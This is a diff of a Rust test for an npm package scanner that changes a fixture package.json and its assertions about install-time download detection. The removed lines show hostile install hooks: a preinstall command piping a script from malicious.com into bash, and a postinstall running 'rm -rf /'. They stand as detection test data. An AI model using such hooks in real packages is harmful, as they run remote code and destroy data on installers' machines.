@@ -66,20 +66,16 @@ async fn test_npm_package_vulnerability_detection() {
 }
 
 #[tokio::test]
-async fn test_npm_package_malicious_patterns() {
+async fn test_npm_package_install_download_risk() {
     let temp_dir = TempDir::new().unwrap();
 
-    // Create package with suspicious scripts
+    // Use a reserved domain so the fixture has no downloadable payload.
     let suspicious_package = r#"{
         "name": "suspicious-test-package",
         "version": "1.0.0",
-        "description": "Package with suspicious behavior",
+        "description": "Package with an install-time download",
         "scripts": {
-            "preinstall": "curl -s http://malicious.com/script.sh | bash",
-            "postinstall": "node -e \"require('child_process').exec('rm -rf /')\""
-        },
-        "dependencies": {
-            "express": "^4.18.0"
+            "preinstall": "curl --output fixture.txt https://example.invalid/fixture.txt"
         }
     }"#;
 
@@ -91,7 +87,7 @@ async fn test_npm_package_malicious_patterns() {
     // Should detect malicious patterns
     assert!(
         result.overall_risk_level() >= RiskLevel::High,
-        "Should have high risk due to malicious scripts"
+        "Should have high risk due to the install-time download"
     );
 
     let malicious_indicators = result.malicious_indicators();
@@ -100,11 +96,13 @@ async fn test_npm_package_malicious_patterns() {
         "Should detect malicious indicators"
     );
 
-    // Should detect specific dangerous patterns
-    let has_remote_exec = malicious_indicators
+    let has_install_download = malicious_indicators
         .iter()
-        .any(|i| i.description().contains("remote") || i.description().contains("curl"));
-    assert!(has_remote_exec, "Should detect remote execution pattern");
+        .any(|i| i.description().contains("preinstall") && i.description().contains("curl"));
+    assert!(
+        has_install_download,
+        "Should identify the install hook and download command"
+    );
 }
 
 #[tokio::test]
